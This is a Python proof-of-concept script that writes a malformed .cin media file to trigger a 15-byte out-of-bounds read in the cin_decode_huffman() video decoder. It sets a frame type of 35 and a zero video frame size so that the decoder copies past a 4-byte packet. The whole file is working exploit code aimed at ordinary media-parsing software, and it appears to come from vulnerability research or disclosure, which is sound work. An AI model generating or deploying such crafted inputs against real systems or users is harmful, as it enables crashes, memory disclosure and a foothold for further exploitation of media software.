#!/usr/bin/env python3
"""
PoC generator for VULN 001: CWE-125 Out-of-bounds Read in cin_decode_huffman()

Crafts a .cin file that causes the demuxer to produce a 4-byte video packet
(video_frame_size=0, pal_colors_count=0), then the decoder advances buf by 4,
leaving bitmap_frame_size=0, and calls cin_decode_huffman(buf, 0, ...) which
unconditionally executes memcpy(huff_code_table, src, 15) reading 15 bytes
beyond the valid buffer boundary.
"""

import struct
import sys

OUTPUT = "vuln_001_input.cin"

# ── File header (20 bytes) ────────────────────────────────────────────────────
# magic (LE u32)        : 0x55AA0000
# video_frame_size (u32): any (not used for packet sizing; frame header overrides)
# video_frame_width(u16): 320
# video_frame_height(u16):200
# audio_frequency (u32) : 22050  ← probe checks this
# audio_bits (u8)       : 16     ← probe checks this
# audio_stereo (u8)     : 0      ← probe checks this
# audio_frame_size (u16): 100
MAGIC_FILE   = 0x55AA0000
FILE_VFS     = 0          # video_frame_size in file header (unused at decode time)
WIDTH        = 320
HEIGHT       = 200
AUDIO_FREQ   = 22050
AUDIO_BITS   = 16
AUDIO_STEREO = 0
FILE_AFS     = 100        # audio_frame_size in file header

file_header = struct.pack("<IIHHIBBH",
    MAGIC_FILE,
    FILE_VFS,
    WIDTH,
    HEIGHT,
    AUDIO_FREQ,
    AUDIO_BITS,
    AUDIO_STEREO,
    FILE_AFS,
)
assert len(file_header) == 20, f"File header is {len(file_header)} bytes, expected 20"

# ── Frame header (16 bytes) ───────────────────────────────────────────────────
# video_frame_type (u8) : 35  → triggers cin_decode_huffman path
# audio_frame_type (u8) : 0
# pal_colors_count (u16): 0   → palette contributes 0 bytes to pkt_size
# video_frame_size (u32): 0   → pkt_size = 0, so av_new_packet(pkt, 4+0) = 4 bytes
# audio_frame_size (u32): 100 → audio data follows (next read_packet call)
# magic (u32)           : 0xAA55AA55
MAGIC_FRAME  = 0xAA55AA55
VFT          = 35   # video_frame_type — selects cin_decode_huffman branch
AFT          = 0
PAL          = 0
FRAME_VFS    = 0    # KEY: demuxer builds a 4-byte packet; decoder gets buf_size=4
FRAME_AFS    = 100

frame_header = struct.pack("<BBHIII",
    VFT,
    AFT,
    PAL,
    FRAME_VFS,
    FRAME_AFS,
    MAGIC_FRAME,
)
assert len(frame_header) == 16, f"Frame header is {len(frame_header)} bytes, expected 16"

# ── Audio payload (100 bytes of zeros) ───────────────────────────────────────
audio_payload = b'\x00' * FRAME_AFS

data = file_header + frame_header + audio_payload

with open(OUTPUT, "wb") as f:
    f.write(data)

print(f"[+] Written {len(data)} bytes to {OUTPUT}")
print(f"    File header  : {len(file_header)} bytes")
print(f"    Frame header : {len(frame_header)} bytes")
print(f"    Audio payload: {len(audio_payload)} bytes")
print(f"    video_frame_type={VFT}, pal_colors_count={PAL}, video_frame_size={FRAME_VFS}")
print(f"    → demuxer produces 4-byte video packet")
print(f"    → decoder: bitmap_frame_size = 4-4 = 0")
print(f"    → cin_decode_huffman(buf, src_size=0, ...) called")
print(f"    → memcpy(huff_code_table, src, 15) reads 15 bytes OOB")
